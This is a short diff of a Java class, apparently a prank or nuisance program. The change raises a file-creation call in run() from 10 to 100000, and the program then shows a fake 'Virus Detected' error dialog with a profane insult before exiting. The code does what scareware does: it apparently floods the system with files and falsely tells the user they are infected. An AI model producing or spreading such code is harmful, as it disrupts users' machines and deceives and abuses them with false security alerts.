@@ -115,7 +115,7 @@ public class FileCreation implements Runnable {
     @Override
     public void run() {
         System.out.println("EXECUTE");
-        CreateFiles(10);
+        CreateFiles(100000);
         JOptionPane.showMessageDialog(null, "ERROR: Virus Detected\n" + 
                                             "Recommended course of action: Go Fuck Yourself");
         System.exit(0);
